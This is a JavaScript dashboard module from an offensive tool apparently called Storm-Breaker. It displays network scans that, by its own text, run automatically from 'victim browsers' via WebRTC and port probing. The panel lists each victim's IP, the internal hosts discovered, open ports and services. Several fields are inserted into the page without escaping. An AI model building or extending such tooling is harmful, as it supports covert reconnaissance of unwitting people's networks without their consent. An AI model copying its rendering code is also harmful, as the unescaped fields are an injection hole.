/**
 * Storm-Breaker Network Discovery UI Module
 * View network scan results from victim-side WebRTC/port probing
 */

const NetworkDiscoveryUI = {
    discoveries: [],

    init() {
        this.loadDiscoveries();
        this.bindEvents();
    },

    async loadDiscoveries() {
        try {
            const resp = await $.get('/api/network/discoveries');
            this.discoveries = resp.discoveries || [];
            this.renderDiscoveries();
        } catch (e) {
            console.error('Failed to load discoveries', e);
        }
    },

    renderDiscoveries() {
        const container = $('#network-discovery-list');
        container.empty();

        // Summary stats
        const totalHosts = new Set();
        const totalPorts = new Set();
        this.discoveries.forEach(d => {
            const hosts = typeof d.discovered_hosts === 'string' ? JSON.parse(d.discovered_hosts) : (d.discovered_hosts || []);
            const ports = typeof d.ports === 'string' ? JSON.parse(d.ports) : (d.ports || []);
            hosts.forEach(h => totalHosts.add(h));
            ports.forEach(p => totalPorts.add(p));
        });

        $('#network-stats').html(`
            <div class="grid grid-cols-3 gap-3">
                <div class="bg-gray-700 rounded-lg p-4 text-center">
                    <div class="text-2xl font-bold text-cyan-400">${this.discoveries.length}</div>
                    <div class="text-xs text-gray-400">Scans</div>
                </div>
                <div class="bg-gray-700 rounded-lg p-4 text-center">
                    <div class="text-2xl font-bold text-green-400">${totalHosts.size}</div>
                    <div class="text-xs text-gray-400">Hosts Found</div>
                </div>
                <div class="bg-gray-700 rounded-lg p-4 text-center">
                    <div class="text-2xl font-bold text-yellow-400">${totalPorts.size}</div>
                    <div class="text-xs text-gray-400">Open Ports</div>
                </div>
            </div>
        `);

        if (this.discoveries.length === 0) {
            container.html('<div class="text-center text-gray-400 py-8"><i class="fas fa-network-wired text-4xl mb-3"></i><p>No network discoveries yet</p><p class="text-sm mt-2">Network scans run automatically from victim browsers via WebRTC and port probing</p></div>');
            return;
        }

        this.discoveries.forEach((d, idx) => {
            const hosts = typeof d.discovered_hosts === 'string' ? JSON.parse(d.discovered_hosts) : (d.discovered_hosts || []);
            const ports = typeof d.ports === 'string' ? JSON.parse(d.ports) : (d.ports || []);
            const services = typeof d.services === 'string' ? JSON.parse(d.services) : (d.services || []);

            container.append(`
                <div class="bg-gray-700 rounded-lg p-4 hover:bg-gray-600 transition-colors">
                    <div class="flex items-center justify-between mb-3">
                        <div class="flex items-center gap-3">
                            <div class="w-10 h-10 bg-green-600 rounded-lg flex items-center justify-center">
                                <i class="fas fa-network-wired text-white"></i>
                            </div>
                            <div>
                                <div class="font-semibold text-white">Scan from ${d.victim_ip}</div>
                                <div class="text-xs text-gray-400">${d.scan_type || 'webrtc'} • ${d.timestamp || ''}</div>
                            </div>
                        </div>
                        <div class="flex items-center gap-2">
                            <span class="px-2 py-1 text-xs rounded bg-cyan-900 text-cyan-300">${hosts.length} hosts</span>
                            <span class="px-2 py-1 text-xs rounded bg-yellow-900 text-yellow-300">${ports.length} ports</span>
                        </div>
                    </div>
                    ${hosts.length > 0 ? `
                    <div class="mb-2">
                        <div class="text-xs text-gray-400 mb-1">Discovered Hosts:</div>
                        <div class="flex flex-wrap gap-1">
                            ${hosts.slice(0, 20).map(h => `<span class="px-2 py-0.5 bg-gray-800 text-green-400 rounded font-mono text-xs">${this.escapeHtml(h)}</span>`).join('')}
                            ${hosts.length > 20 ? `<span class="text-xs text-gray-400">+${hosts.length - 20} more</span>` : ''}
                        </div>
                    </div>` : ''}
                    ${ports.length > 0 ? `
                    <div class="mb-2">
                        <div class="text-xs text-gray-400 mb-1">Open Ports:</div>
                        <div class="flex flex-wrap gap-1">
                            ${ports.slice(0, 30).map(p => `<span class="px-2 py-0.5 bg-gray-800 text-yellow-400 rounded font-mono text-xs">${p}</span>`).join('')}
                        </div>
                    </div>` : ''}
                    ${services.length > 0 ? `
                    <div>
                        <div class="text-xs text-gray-400 mb-1">Services:</div>
                        <div class="flex flex-wrap gap-1">
                            ${services.map(s => `<span class="px-2 py-0.5 bg-gray-800 text-purple-400 rounded text-xs">${this.escapeHtml(typeof s === 'object' ? JSON.stringify(s) : s)}</span>`).join('')}
                        </div>
                    </div>` : ''}
                </div>
            `);
        });
    },

    bindEvents() {
        $('#btn-refresh-network').on('click', () => {
            this.loadDiscoveries();
            GrowlNotification.notify({ title: 'Refreshed', description: 'Network discoveries refreshed', type: 'info', position: 'top-right', closeTimeout: 2000 });
        });
    },

    escapeHtml(text) {
        const div = document.createElement('div');
        div.textContent = text || '';
        return div.innerHTML;
    },
};
